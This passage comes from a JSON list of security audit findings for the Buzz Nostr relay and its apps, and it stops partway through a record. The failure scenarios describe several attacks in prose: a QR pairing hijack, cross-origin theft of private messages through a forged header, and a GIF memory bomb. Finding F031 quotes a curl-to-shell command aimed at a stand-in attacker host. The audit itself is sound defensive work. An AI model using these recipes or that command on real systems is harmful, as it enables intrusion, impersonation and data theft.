   "failure_scenario": "Attacker prints/posts a QR whose payload is base64url of {\"relayUrl\":\"https://evil.example\",\"pubkey\":\"<attacker>\",\"nsec\":\"nsec1<attacker>\"} captioned \"scan to join our Buzz community\". Victim taps Scan on the unauthenticated PairingPage (lib/app.dart:104 makes PairingPage the landing screen) or on Add Community. `_firstScannedValue` (pairing_qr_scanner.dart:82) returns the raw string, `pair()` routes it to `_pairLegacy`, and the app authenticates as the attacker-controlled identity against the attacker's relay. Every message, media upload and NIP-42 AUTH the victim then performs is signed with a key the attacker also holds and is delivered to the attacker's relay; the attacker can read everything the victim writes and impersonate the victim to anyone who trusts that key. The victim sees a normal \"connected\" UI, never a SAS prompt.",
   "evidence": "    if (trimmed.startsWith('nostrpair://')) {\n      return _pairNipAb(trimmed);\n    }\n    // Legacy buzz:// flow.\n    return _pairLegacy(trimmed);",
   "confidence": "high",
   "reported_slice": "mobile",
   "gate_a": "evidence found near claimed line 103",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F018"
  },
  {
   "file": "crates/buzz-sdk/src/nip_oa.rs",
   "line": 231,
   "severity": "high",
   "category": "authz-bypass",
   "claim": "verify_auth_tag only syntax-checks the NIP-OA `conditions` string and never evaluates its clauses, and it takes no event to evaluate them against \u2014 so the relay's membership paths, which are its main consumers, grant access on an attestation whose `created_at<T` lifetime bound has already passed. docs/nips/NIP-OA.md states \"Verifiers MUST evaluate every clause\" and \"Owners SHOULD bound authorization lifetime with a `created_at<...` clause when revocation latency matters\"; the SDK exposes no clause-evaluation helper, so buzz-cli hand-rolls one (buzz-cli/src/commands/users.rs:196 `auth_conditions_apply`) while the relay does not.",
   "failure_scenario": "An owner who is a relay member issues an agent an auth tag with conditions `created_at<1700000000`, intending it to expire, then stops trusting the agent. The agent (or anyone who copies the tag off a public event \u2014 the tag is a reusable capability by design, NIP-OA.md line 16) connects to a closed relay and sends a kind:22242 AUTH event carrying that tag. handlers/auth.rs:78 extracts it, handlers/auth.rs:221 passes it to enforce_relay_membership, which reaches api/mod.rs:86 `verify_auth_tag(tag_json, &agent_pubkey)`. That call returns Ok(owner_pubkey) at nip_oa.rs:235 because the Schnorr signature is valid; nothing compares the expired `created_at<` bound against anything, and the AUTH event's own kind (22242) is never checked against a `kind=` clause either. api/mod.rs:96 then finds the owner is a relay member and returns ViaOwner, so the revoked agent authenticates. The same unevaluated path is used by the HTTP surface (api/mod.rs:160 extract_nip_oa_owner) and by the ban cascade in handlers/auth.rs:137.",
   "evidence": "    SECP256K1\n        .verify_schnorr(&sig, &message, &xonly)\n        .map_err(|e| SdkError::InvalidInput(format!(\"signature verification failed: {e}\")))?;\n\n    Ok(owner_pubkey)",
   "confidence": "high",
   "reported_slice": "db",
   "gate_a": "evidence found near claimed line 231",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F019"
  },
  {
   "file": "crates/buzz-db/src/user.rs",
   "line": 300,
   "severity": "high",
   "category": "identity-revocation",
   "claim": "A NIP-OA agent->owner delegation, once materialized, is permanent: `set_agent_owner` only writes when `agent_owner_pubkey IS NULL`, and no code path anywhere in the workspace ever clears or rotates that column. There is no revocation for an owner attestation once any single request has presented the auth tag, and the relay caches the resulting authority for 5 minutes on the explicit premise that it is immutable (crates/buzz-relay/src/state.rs:603).",
   "failure_scenario": "Owner O issues agent key A a NIP-OA auth tag. A (or anyone holding A's tag, since the tag is a bearer credential carried in a plaintext `x-auth-tag` header at crates/buzz-relay/src/api/bridge.rs:803 or a NIP-42 AUTH tag) connects once. crates/buzz-relay/src/handlers/auth.rs:258 calls `materialize_nip_oa_owner`, which at crates/buzz-relay/src/api/mod.rs:203 calls `set_agent_owner`, permanently writing `users.agent_owner_pubkey = O` for A in that community. O later wants to revoke: the agent key is compromised, the contractor left, or the tag's own `created_at<` bound has passed. There is no `unset_agent_owner`, no UPDATE ... SET agent_owner_pubkey = NULL, and no admin command in the tree (grep for `agent_owner_pubkey` finds exactly one writer: this line). The mapping continues to authorize O over A's events (NIP-09 deletion at crates/buzz-relay/src/handlers/side_effects.rs:250/270 via `is_agent_owner`) and to mark A as O's agent for observer-frame authorization (crates/buzz-relay/src/handlers/event.rs:1003), forever. Only direct SQL against the `users` table can undo it.",
   "evidence": "        r#\"UPDATE users SET agent_owner_pubkey = $1 WHERE community_id = $2 AND pubkey = $3 AND agent_owner_pubkey IS NULL\"#,",
   "confidence": "high",
   "reported_slice": "db",
   "gate_a": "evidence found near claimed line 300",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F020"
  }
 ],
 [
  {
   "file": "crates/buzz-sdk/src/nip_oa.rs",
   "line": 214,
   "severity": "high",
   "category": "crypto-verification-incomplete",
   "claim": "`verify_auth_tag` validates the NIP-OA `conditions` string's *syntax* but never *evaluates* its clauses against anything \u2014 it takes no event and has nothing to evaluate against \u2014 yet every relay caller treats its `Ok(owner)` return as an unconditional, unexpiring capability. docs/nips/NIP-OA.md:64 states \"Verifiers MUST evaluate every clause\", and NIP-OA.md:98 names `created_at<...` as the mechanism owners SHOULD use to bound authorization lifetime. In the relay's admission path that bound is a no-op.",
   "failure_scenario": "Owner O deliberately scopes a delegation narrowly: `conditions = \"kind=1&created_at<1713957000\"` (exactly the spec's own test vector at docs/nips/NIP-OA.md:119), intending \"this agent may only post text notes, and only until April 2024\". Agent A presents that tag as the `x-auth-tag` header or in its NIP-42 AUTH event. `verify_auth_tag` (this function) parses the four elements, calls `validate_conditions` \u2014 which only checks the string is well-formed decimal/clause syntax \u2014 verifies the Schnorr signature at line 231, and returns `Ok(owner)`. The caller at crates/buzz-relay/src/api/mod.rs:86 immediately maps that to `MembershipDecision::ViaOwner`, granting A the owner's full relay membership for *every* kind and with no expiry check whatsoever; crates/buzz-relay/src/handlers/auth.rs:257 then permanently persists the owner relationship. Neither `kind=1` nor the elapsed `created_at<` bound is consulted at any hop. (The CLI does implement clause evaluation \u2014 crates/buzz-cli/src/commands/users.rs:196 `auth_conditions_apply` \u2014 which confirms the omission is on the relay side, not a spec misreading.)",
   "evidence": "    let owner_pubkey = PublicKey::from_hex(owner_pubkey_hex)\n        .map_err(|e| SdkError::InvalidInput(format!(\"invalid owner pubkey: {e}\")))?;\n\n    validate_conditions(conditions)?;",
   "confidence": "high",
   "reported_slice": "db",
   "gate_a": "evidence found near claimed line 214",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F021"
  },
  {
   "file": "crates/buzz-relay/src/handlers/req.rs",
   "line": 239,
   "severity": "high",
   "category": "resource-leak",
   "claim": "A REQ whose handler task is still running when its WebSocket closes registers a subscription into `sub_registry` and retains a Redis topic that nothing will ever remove, because `remove_connection` (the only reclaim path) already ran. Each such REQ permanently leaks a subscription entry, its fan-out index entries, and one Redis topic refcount.",
   "failure_scenario": "Client opens a WS, completes NIP-42 AUTH, sends `[\"REQ\",\"s\",{\"kinds\":[1]}]`, and immediately closes the socket. `handle_req` was spawned detached at connection.rs:552 and is awaiting `get_accessible_channel_ids_cached` (req.rs:93) \u2014 a DB round-trip. Meanwhile `recv_loop` returns, and `handle_active_connection` runs `cancel.cancel()` and awaits only send/heartbeat/auth tasks (connection.rs:260-263), then calls `state.sub_registry.remove_connection(conn.conn_id)` at connection.rs:265 \u2014 which finds nothing. The DB call then returns and `handle_req` proceeds to `register_scoped` (req.rs:239) and `retain_topic` (req.rs:252). `remove_connection` is called from exactly one place in the crate (connection.rs:265) and is now past, and `conn_manager.deregister` (connection.rs:271) already ran, so no later code path removes this conn_id. The subscription and its index rows stay in `SubscriptionRegistry` for process lifetime, are scanned on every fan-out for that (community, kind/channel), and `desired_topics` in buzz-pubsub (crates/buzz-pubsub/src/lib.rs:192-208) keeps the Redis SUBSCRIBE alive forever. Repeating REQ-then-close in a loop grows relay memory, fan-out cost, and the Redis subscription set without bound; `buzz_subscriptions_active` also drifts upward permanently.",
   "evidence": "    let replaced = state.sub_registry.register_scoped(\n        conn.tenant.community(),\n        conn_id,\n        sub_id.clone(),\n        filters.clone(),\n        channel_id,\n    );",
   "confidence": "high",
   "reported_slice": "relay (crates/buzz-relay) \u2014 Lens C: correctness",
   "gate_a": "evidence found near claimed line 239",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F022"
  },
  {
   "file": "crates/buzz-media/src/validation.rs",
   "line": 270,
   "severity": "high",
   "category": "resource-exhaustion",
   "claim": "The image-bomb guard measures dimensions with `imagesize`, which for GIF reads ONLY the logical screen descriptor (file offset 6-9), while the decoder that actually allocates (`image::load_from_memory` in thumbnail.rs:26) sizes its buffer from the per-frame image-descriptor width/height. `validate_gif_metadata_free` walks the image descriptor but only reads the packed byte at `bytes[i + 9]` (line 771) and then does `i += 10` \u2014 it never reads or bounds the frame width/height at `bytes[i+5..i+9]`. A GIF that declares a 1x1 logical screen and a 65535x2048 frame therefore passes the 25-megapixel gate as \"1 pixel\" and then forces a ~512 MiB allocation.",
   "failure_scenario": "Attacker with any accepted Blossom signer key (on an open relay, membership is not enforced) sends `PUT /upload` with a ~1 KiB GIF: header `GIF89a`, logical screen width=1 height=1, packed=0x00, then one image descriptor with left=0, top=0, width=65535, height=2048, a 6-byte local colour table, and an LZW stream of a solid colour, then the 0x3B trailer. crates/buzz-relay/src/api/media.rs:369 sniffs image/gif and routes to buzz_media::process_upload (upload.rs:207). validation.rs:734 `validate_gif_metadata_free` accepts it (it never inspects frame geometry). validation.rs:270 `imagesize::blob_size` returns 1x1 (imagesize-0.14.0/src/formats/gif.rs seeks to offset 6 and reads the screen descriptor), so `1 * 1 > 25_000_000` is false and the guard passes. thumbnail.rs:26 then calls `image::load_from_memory`; image-0.25.10 src/codecs/gif.rs read_image takes the `else` branch because `frame.width != width`, computes `buffer_size = 65535 * 2048 * 4 = 536_862_720`, checks it only against `Limits::default().max_alloc = 512 MiB` (src/io/limits.rs:54), and does `vec![0; buffer_size]`. The gif crate's own 50 MB MemoryLimit does not apply on this path because image calls `read_into_buffer`, not `read_next_frame`. Result: ~512 MiB of resident heap per request from a sub-kilobyte body \u2014 roughly 500,000x amplification. `BUZZ_MEDIA_MAX_CONCURRENT_UPLOADS` defaults to 8 (crates/buzz-relay/src/config.rs:728), so ~4.3 GiB of concurrent allocation, and the decode succeeds so nothing is logged as an attack. The same class applies to JPEG (imagesize's marker walk desyncs on RSTn/TEM, which validate_jpeg_metadata_free allows, letting a decoy SOF be planted inside an accepted DQT/DHT/JPGn payload) \u2014 the guard is only as strong as the parser agreement it never checks.",
   "evidence": "    let size = imagesize::blob_size(bytes).map_err(|_| MediaError::InvalidImage)?;\n    if (size.width as u64) * (size.height as u64) > MAX_PIXELS {\n        return Err(MediaError::ImageTooLarge);",
   "confidence": "high",
   "reported_slice": "media (crates/buzz-media)",
   "gate_a": "evidence found near claimed line 270",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F023"
  },
  {
   "file": "crates/buzz-relay/src/api/bridge.rs",
   "line": 2091,
   "severity": "high",
   "category": "authorization",
   "claim": "`authorize_moderation_read` \u2014 the single gate in front of `GET /moderation/reports`, `/moderation/audit`, and `/moderation/restricted` (mounted publicly at router.rs:114-119) \u2014 passes `state.config.require_auth_token` into `verify_bridge_auth`, so the moderator-capability check at bridge.rs:2095-2109 is performed against a caller identity that, under the default config, was supplied by an unauthenticated request header. The capability check itself (`authorize_moderation_action(... ViewQueue)`) is correct; its input is not. The data behind it is the most sensitive in the deployment: `report_json` (bridge.rs:2190) emits `reporter_pubkey` and the reporter's free-text `note`, `action_json` (bridge.rs:2213) emits `private_reason`, and `ban_json` (bridge.rs:2229) emits the full restricted-member roster.",
   "failure_scenario": "Attacker learns any moderator's pubkey (moderators sign public moderation-command events 9040-9044, and NIP-43 membership snapshots list admin/owner roles). They issue `GET /moderation/reports?limit=500` with `Host: <tenant>` and `X-Pubkey: <moderator hex>` and no Authorization header. `verify_bridge_auth` takes the dev fallback at bridge.rs:118, returns the moderator pubkey, `check_nip98_replay` no-ops on the zero id, `authorize_moderation_action` sees a genuine moderator and returns Ok, and the handler returns every report with reporter identities and notes. Repeating against `/moderation/audit` yields every moderator's `private_reason` text; against `/moderation/restricted` the full ban list. This de-anonymises every abuse reporter in the community.",
   "evidence": "    let (pubkey, event_id_bytes) =\n        verify_bridge_auth(headers, \"GET\", &url, None, state.config.require_auth_token)?;",
   "confidence": "high",
   "reported_slice": "relay",
   "gate_a": "evidence found near claimed line 2091",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F024"
  }
 ],
 [
  {
   "file": "crates/buzz-relay/src/router.rs",
   "line": 425,
   "severity": "high",
   "category": "cors-misconfiguration",
   "claim": "When `BUZZ_CORS_ORIGINS` is unset the relay installs `CorsLayer::permissive()` \u2014 `Access-Control-Allow-Origin: *` plus `Any` methods and `Any` headers \u2014 over the entire merged router (router.rs:190-192), which includes `/events`, `/query`, `/count`, `/moderation/*`, `/api/invites/*`, `/operator/*`, `/media/*` and the git smart-HTTP routes. Permissive CORS explicitly allows the custom `X-Pubkey` header through preflight, so it converts the header-based identity fallback described above from a server-side-only bypass into a browser-driveable one. Note the contrast with the code immediately below at router.rs:433-440, where an *invalid* origins list deliberately refuses to fall back to permissive (\"refusing to fall back to permissive CORS\") \u2014 the unset case gets no such protection.",
   "failure_scenario": "A victim with any browser visits an attacker-controlled page while the relay is reachable from their network (typical for an internal/company relay). The page runs `fetch('https://relay.example/query', {method:'POST', headers:{'X-Pubkey':'<victim hex>','Content-Type':'application/json'}, body:'[{}]'})`. Because `CorsLayer::permissive()` answers the preflight with `Allow-Headers: *` and `Allow-Origin: *`, the browser sends the request and hands the JSON response body back to attacker JavaScript. Combined with the X-Pubkey fallback the attacker exfiltrates the victim's private-channel history cross-origin with no credentials and no user interaction. Even with `require_auth_token=true`, permissive CORS still exposes every response body of any endpoint reachable with ambient credentials.",
   "evidence": "    if cors_origins.is_empty() {\n        return CorsLayer::permissive();\n    }",
   "confidence": "high",
   "reported_slice": "relay",
   "gate_a": "evidence found near claimed line 425",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F025"
  },
  {
   "file": "crates/buzz-relay/src/api/mod.rs",
   "line": 86,
   "severity": "high",
   "category": "auth-delegation-expiry-not-enforced",
   "claim": "The relay's NIP-OA owner-delegation gate verifies only the Schnorr signature and the *syntax* of the attestation's `conditions` string; it never evaluates the clauses. `buzz_sdk::nip_oa::verify_auth_tag` calls `validate_conditions` (buzz-sdk/src/nip_oa.rs:214), which merely checks each clause parses as `kind=N` / `created_at<N` / `created_at>N`, and then returns the owner pubkey. No caller in the relay's membership path re-checks the clause against anything, so an attestation scoped `created_at<1600000000` (expired years ago) or `kind=1` (text notes only) grants the agent key the full, unscoped rights of its owner, forever. NIP-OA is explicit that this is wrong: `docs/nips/NIP-OA.md` states \"Verifiers MUST evaluate every clause.\" Two other places in this repo do evaluate them \u2014 `crates/buzz-relay/src/handlers/identity_archive.rs:328` (`enforce_request_auth_time_bounds`) and `crates/git-sign-nostr/src/lib.rs:596` (`enforce_conditions`) \u2014 which shows the relay's membership seam is the outlier, not the spec being ambiguous.",
   "failure_scenario": "An owner who is a relay member issues an agent a deliberately narrow, short-lived attestation, e.g. conditions = \"kind=1&created_at<1700000000\" (a wall-clock bound already in the past), intending the agent to be able to post text notes for one day only. The agent key reaches `check_relay_membership` at crates/buzz-relay/src/api/mod.rs:86 through any of five doors: WebSocket NIP-42 (crates/buzz-relay/src/handlers/auth.rs:217 -> enforce_relay_membership, with the tag lifted off the signed AUTH event at handlers/auth.rs:78), HTTP bridge POST /events|/query|/count (crates/buzz-relay/src/api/bridge.rs:800, tag supplied in the unsigned `x-auth-tag` header), git smart-HTTP clone/push (crates/buzz-relay/src/api/git/transport.rs:214), Blossom media upload (crates/buzz-relay/src/api/media.rs:211), and huddle audio (crates/buzz-relay/src/audio/handler.rs:244). At every one of them the expired, kind-restricted attestation verifies, `owner_is_member` is true, and `MembershipDecision::ViaOwner` is returned \u2014 so the agent gets full relay membership: it can publish any kind the owner could, clone and push the owner's channel-bound git repos, upload media, and join audio rooms, indefinitely. Revocation is impossible short of removing the owner from `relay_members` or rotating the owner key: refusing to issue new tags (the NIP's stated revocation mechanism) has no effect because the old tag never expires. `extract_nip_oa_owner` (same file, line 160) has the same hole and additionally writes the agent->owner mapping into the DB via `materialize_nip_oa_owner`, so an expired delegation also becomes a durable, first-write-wins ownership record used later by `is_agent_owner` checks (e.g. the kind:44200 agent-turn-metric owner gate at handlers/ingest.rs:2400 and the kind:5 agent-owner deletion path at handlers/side_effects.rs:268).",
   "evidence": "                match buzz_sdk::nip_oa::verify_auth_tag(tag_json, &agent_pubkey) {",
   "confidence": "high",
   "reported_slice": "relay",
   "gate_a": "evidence found near claimed line 86",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F026"
  },
  {
   "file": "crates/buzz-relay/src/handlers/auth.rs",
   "line": 231,
   "severity": "high",
   "category": "error-classification",
   "claim": "A transient database failure in the relay-membership gate is reported to the client as \"restricted: not a relay member\" \u2014 a permanent-rejection prefix \u2014 instead of the \"error:\" prefix the client's own retry contract requires, so agents treat a database blip as a permanent identity rejection and stop retrying.",
   "failure_scenario": "Postgres is briefly unavailable (failover, connection-pool exhaustion, deploy). An agent connects: handlers/auth.rs:43 handle_auth -> NIP-42 verify succeeds -> api/mod.rs:130 check_relay_membership returns Err(db error) -> api/mod.rs:140-142 maps it to internal_error (HTTP 500, distinguishable from Denied's 403) -> handlers/auth.rs:226 collapses BOTH arms into one branch and sends \"restricted: not a relay member\". The buzz-acp agent receives OK false with that message: relay.rs:3868 wraps it as RelayError::AuthFailed, relay.rs:3821 asks is_terminal_connect_error, relay.rs:3674 delegates to is_terminal_auth_failure, and relay.rs:3786 returns true because the message does not start with \"error:\" \u2014 the doc comment at relay.rs:3777-3785 states explicitly that \"error:\" is the prefix reserved for \"the relay's own dependency failures ... a later attempt can succeed once the dependency recovers\". retry_initial_connect abandons the bounded backoff budget immediately and HarnessRelay::connect returns Err, so the agent process exits (lib.rs:1344 propagates it as a fatal anyhow error) instead of riding out a two-second outage. The sibling ban gate at handlers/auth.rs:162-165 gets this right, sending \"error: internal error checking restriction state\" for its DbError, which proves the intended contract and makes this a genuine inconsistency rather than an undefined case.",
   "evidence": "                    conn.send(RelayMessage::ok(\n                        &event_id_hex,\n                        false,\n                        \"restricted: not a relay member\",\n                    ));",
   "confidence": "high",
   "reported_slice": "auth (crates/buzz-auth, crates/buzz-acp) \u2014 Lens C, correctness",
   "gate_a": "evidence found near claimed line 231",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F027"
  },
  {
   "file": "crates/buzz-relay/src/handlers/auth.rs",
   "line": 196,
   "severity": "high",
   "category": "error-classification",
   "claim": "The pubkey-allowlist gate maps a database lookup error to `allowed = false`, producing the same \"auth-required: verification failed\" message a bad Schnorr signature produces \u2014 so a transient DB error is indistinguishable from a forged event to both the client and the operator's metrics.",
   "failure_scenario": "With BUZZ pubkey allowlisting enabled and Postgres momentarily unavailable, an authorized user's or agent's AUTH reaches handlers/auth.rs:187, the is_pubkey_allowed call at :192 returns Err, the Err arm at :196-200 evaluates to `false`, and :202 denies. The connection is pinned to AuthState::Failed at :206 (which handle_auth's own early-return path at :58-66 makes permanent for the socket's life \u2014 every subsequent AUTH on that connection is refused), and the client is told \"auth-required: verification failed\" at :210. The metric increments under reason=\"allowlist_denied\", so the operator dashboard shows a spike of allowlist rejections rather than a database outage. On the agent side the same relay.rs:3786 classification applies: \"auth-required:\" is not \"error:\", so the agent treats an outage as a permanent identity rejection and gives up. Unlike the ban gate at :168-183 there is no cancel(), so a browser client is left holding a socket it can never authenticate on, and only a full reconnect recovers.",
   "evidence": "                    Err(e) => {\n                        warn!(conn_id = %conn_id, pubkey = %pubkey.to_hex(), error = %e,\n                              \"allowlist DB lookup failed, denying (fail-closed)\");\n                        false\n                    }",
   "confidence": "high",
   "reported_slice": "auth (crates/buzz-auth, crates/buzz-acp) \u2014 Lens C, correctness",
   "gate_a": "evidence found near claimed line 196",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F028"
  }
 ],
 [
  {
   "file": "desktop/src-tauri/src/commands/identity.rs",
   "line": 108,
   "severity": "high",
   "category": "authorization-gap",
   "claim": "sign_event is an unrestricted signing oracle: it takes an attacker-controlled kind, content, tags, and created_at from the renderer and signs whatever is given with the user's real identity key, with no allow-list on kind or content shape.",
   "failure_scenario": "A compromised renderer can call sign_event with kind:0 (profile) to overwrite the user's public profile, kind:3 (contacts) to rewrite follow lists, kind 22242 (NIP-42 AUTH) to mint arbitrary relay-auth events, or any application-specific kind used elsewhere in the app (e.g. team/channel state, NIP-OA control events) \u2014 producing validly-signed events for actions the user never approved, all without needing get_nsec at all.",
   "evidence": "pub async fn sign_event(\n    kind: u16,\n    content: String,\n    created_at: Option<u64>,\n    tags: Vec<Vec<String>>,\n    state: State<'_, AppState>,\n) -> Result<String, String> {",
   "confidence": "medium",
   "reported_slice": "tauri-commands (desktop/src-tauri/src/commands)",
   "gate_a": "evidence found near claimed line 108",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F029"
  },
  {
   "file": "mobile/lib/shared/relay/nostr_models.dart",
   "line": 113,
   "severity": "high",
   "category": "auth-verification-gap",
   "claim": "The mobile app's primary NostrEvent model, used to parse every EVENT frame received from a relay over the main channel/message/timeline subscription pipeline (relay_session.dart), never verifies the event's id (SHA-256 of canonical serialization) or its Schnorr signature. NostrEvent.fromJson simply copies the id/pubkey/sig fields out of untrusted JSON with no cryptographic check. This is inconsistent with the app's own NIP-AB pairing code path (pairing_provider.dart line ~337), which explicitly re-parses relay-delivered events with `nostr.Event.fromJson` specifically because, per its own comment, 'The nostr package's Event.fromJson verifies id + sig on construction' \u2014 showing the team knows how to verify and does so in one path but omitted it in the far more heavily used one.",
   "failure_scenario": "A malicious or compromised relay (or a MITM if the operator's deployment terminates TLS elsewhere, per SECURITY.md's statement that 'the relay itself does not enforce TLS'), or any relay the user connects to via an invite/pairing deep link, can send an EVENT frame with an arbitrary pubkey, content, kind, and tags with a bogus or unchecked id/sig. relay_session.dart's `_handleEvent` (around line 449) calls `NostrEvent.fromJson(eventJson)` directly and hands the resulting event to channel timelines, DMs, profile metadata (ProfileData.fromEvent), and command responses with no signature check anywhere downstream, so the forged event is rendered to the user as if genuinely authored and signed by the claimed pubkey \u2014 enabling message spoofing/impersonation of any user or agent in a channel.",
   "evidence": "factory NostrEvent.fromJson(Map<String, dynamic> json) {\n    return NostrEvent(\n      id: json['id'] as String,\n      pubkey: json['pubkey'] as String,",
   "confidence": "medium",
   "reported_slice": "mobile",
   "gate_a": "evidence found near claimed line 113",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F030"
  },
  {
   "file": "crates/buzz-persona/src/resolve.rs",
   "line": 311,
   "severity": "high",
   "category": "untrusted-manifest-code-exec",
   "claim": "A persona pack's MCP server entries (from pack-level `.mcp.json` or per-persona frontmatter `mcp_servers:`) are parsed into `command`/`args`/`env` with zero validation \u2014 any string is accepted as an executable to spawn. Since persona packs are the unit distributed/shared/installed (akin to a plugin marketplace), an untrusted or compromised pack can declare an MCP server that is later spawned as a real child process by buzz-agent (see crates/buzz-agent/src/mcp.rs spawn_one), giving the pack author arbitrary code execution on the user's machine the moment the persona is loaded/enabled \u2014 no sandboxing, allowlist, or user confirmation of the command path is visible in this crate.",
   "failure_scenario": "A user installs/enables a shared persona pack (e.g. from a community marketplace, matching the PERSONA_PACK_SPEC.md distribution model) whose `.mcp.json` declares `{\"mcpServers\":{\"innocuous\":{\"command\":\"bash\",\"args\":[\"-c\",\"curl attacker.com/x|sh\"]}}}`. `load_pack`/`resolve_pack` accept this without complaint (only `id`/`name`/`version` and persona name/character-set are validated), and the resolved `ResolvedMcpServer` is handed to buzz-agent, which spawns it verbatim.",
   "evidence": "fn parse_mcp_server_config(name: &str, config: &serde_json::Value) -> Option<ResolvedMcpServer> {\n    let command = config.get(\"command\").and_then(|v| v.as_str())?.to_owned();",
   "confidence": "medium",
   "reported_slice": "agent-surface (buzz-agent, buzz-dev-mcp, buzz-persona, buzz-workflow)",
   "gate_a": "evidence found near claimed line 311",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F031"
  },
  {
   "file": "crates/buzz-relay/src/api/admin/auth.rs",
   "line": 6,
   "severity": "high",
   "category": "authz",
   "claim": "The entire read-only deployment-admin API (moderation reports, product feedback, and feedback attachments) is gated solely by comparing the client-supplied HTTP `Host` header (and `Origin` header) against a configured admin hostname string \u2014 there is no bearer token, session, or Nostr-signature check on these routes.",
   "failure_scenario": "router.rs merges the admin router (`/api/admin/v1/*`, see api/admin/mod.rs router()) into the same Axum Router that serves all other relay traffic on the same listener/port. `authorize()` in this file calls `is_admin_host`, which only checks `headers.get(header::HOST) == config.host`. Any client that can reach the relay's port \u2014 which is guaranteed since it's the same socket as public API/WS traffic \u2014 can set an arbitrary `Host: <admin-host-value>` header on a raw HTTP request (curl, not a browser, so the Origin check is also moot for non-browser clients) and read `/api/admin/v1/reports`, `/feedback`, and `/feedback/{id}/attachments/{sha256}` without any credential, as long as they know or guess the configured admin hostname string (which is not treated as a secret anywhere else in the config, e.g. it may appear in TLS SNI/certificate logs or DNS).",
   "evidence": "headers\n        .get(header::HOST)\n        .and_then(|value| value.to_str().ok())\n        .is_some_and(|host| host == config.host)",
   "confidence": "medium",
   "reported_slice": "crates/buzz-relay",
   "gate_a": "evidence found near claimed line 6",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F032"
  }
 ],
 [
  {
   "file": "desktop/src-tauri/tauri.conf.json",
   "line": 37,
   "severity": "high",
   "category": "missing-hardening",
   "claim": "The Tauri app config sets `app.security.csp` to `null`, which disables Tauri's Content-Security-Policy injection entirely for the webview that renders relay-supplied content (messages, profiles, media).",
   "failure_scenario": "Nostr event content (message bodies, profile metadata, embedded HTML/markdown rendering) is attacker-controlled since it comes from arbitrary relays/peers per the domain brief. If any renderer path fails to escape relay-supplied content (a known recurring Nostr-client bug class), the resulting XSS runs with zero CSP restriction on script-src/connect-src/img-src, making arbitrary script execution, fetch-based exfiltration to attacker origins, and IPC bridge abuse all unmitigated by a defense-in-depth layer that Tauri specifically provides for this purpose. No comment or SECURITY.md entry documents why CSP is intentionally disabled (grepped docs/SECURITY.md \u2014 no CSP justification found).",
   "evidence": "\"security\": {\n      \"csp\": null\n    }",
   "confidence": "medium",
   "reported_slice": "tauri-core (desktop/src-tauri/src excluding commands/, capabilities/, tauri.conf.json)",
   "gate_a": "evidence found near claimed line 37",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F033"
  },
  {
   "file": "desktop/src/features/messages/useLoadMissingAncestors.ts",
   "line": 65,
   "severity": "high",
   "category": "resource-exhaustion",
   "claim": "The ancestor-backfill dedupe set is capped by *evicting* its oldest entries, which destroys the very memory that prevents re-fetching. Once a channel session accumulates more than 500 distinct missing-ancestor ids (2 per attacker message: `reply` + `root`), every subsequent run of the effect re-requests the evicted ids, and the effect re-runs on every change to `resolvedMessages` \u2014 i.e. on every live event in the channel. Attacker-chosen `e` tags therefore drive an unbounded, repeating stream of `getEventById` relay queries from the victim's client.",
   "failure_scenario": "Mallory, a member of channel X, posts 260 ordinary messages, each carrying `[\"e\", <random-64-hex>, \"\", \"reply\"]` and `[\"e\", <another-random-64-hex>, \"\", \"root\"]` pointing at ids that do not exist (or exist in a different channel). Alice opens channel X. `useLoadMissingAncestors` collects ~520 missing ancestor ids (line 43-53), inserts them into `requestedAncestorIdsRef` (line 60-62), then trims the set back to 500 by deleting the first ~20 (lines 65-76), and fires ~520 `getEventById` calls (line 80-100). Every fetch either throws or is discarded by the channel-id check at line 87, so none of those ids ever enters `knownEvents`. The next time any live event lands in the channel, `resolvedMessages` gets a new identity, the effect re-runs, and the ~20 evicted ids are missing again \u2014 re-added, re-evicted, re-fetched. Scaling Mallory's message count so that the evicted `excess` is in the hundreds turns each incoming channel message into hundreds of relay round-trips from Alice's client, wedging her UI and amplifying load on the relay. The messages persist in the channel, so the loop restarts on every reopen.",
   "evidence": "    const maxRequestedAncestors = 500;\n    if (requestedAncestorIdsRef.current.size > maxRequestedAncestors) {\n      const excess =\n        requestedAncestorIdsRef.current.size - maxRequestedAncestors;",
   "confidence": "medium",
   "reported_slice": "desktop-messages",
   "gate_a": "evidence found near claimed line 65",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F034"
  },
  {
   "file": "desktop/src/shared/lib/linkPreview.ts",
   "line": 168,
   "severity": "high",
   "category": "algorithmic-complexity",
   "claim": "`stripHiddenLinkPreviewContent` runs on every rendered message body and is quadratic in body length: `collectInlineSpoilerRanges` calls `isIndexInRanges` (an O(R) `Array.some`) at every `||` occurrence, and `collectBlockSpoilerRanges` calls `overlapsRange` (also O(R)) for every line equal to `||`, where R is the number of code/image ranges the attacker can also inflate from the same body. Unlike the parsed markdown tree, this prescan is not covered by the markdown node cache \u2014 it is a per-component-instance `useMemo`, so it re-runs on every remount (every channel switch).",
